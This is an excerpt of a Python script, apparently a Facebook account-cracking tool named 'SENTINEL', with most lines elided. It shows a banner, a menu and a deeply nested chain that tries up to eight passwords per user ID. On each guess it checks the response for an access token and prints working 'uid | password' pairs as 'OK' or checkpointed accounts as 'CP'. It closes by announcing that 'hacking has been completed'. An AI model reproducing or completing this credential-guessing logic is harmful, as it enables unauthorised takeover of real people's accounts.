...
def logo():
	...
	os.system('echo "\n  ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓\n  ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒\n  ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░\n  ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██\n   ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒\n   ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░\n    ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n    ░   ▒░  ░ ░ ░ ░ ░ ▒ ░░      ░\n        ░  ░  ░ ░     ░         ░\n            ░\n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: {SENTINEL}        ║\n    ║ AUTHOR   : 🔥 SENTINEL X AZIM VAU🔥       ║\n    ║ GITHUB   : git.io/Sentinel101    ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
...
def log_sel():
	...
	if sel == "":
		...
		print("\t\033[91;1m  SELECT AN OPTION BOY -_")
...
def menu():
    ...
    print("\033[93;1m     SENTINEL : \033[92;1m"+xn)
...
def crack_select1():
	...
	if select =="1":
		...
		print("\t\033[92;1m SENTINEL PUBLIC ID COINING ")
	...
	print("\033[94;1m  LETS JUST PRAY\033[92;1m✘\033[91;1m✘\x1b[0m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass7+"\033[0;97m")
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[SENTINEL-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[SENTINEL-CP] "+uid+" | "+pass8+"\033[0;97m")
	...
	print("\033[92;1m SENTINEL HACKING HAS BEEN COMPLETED")
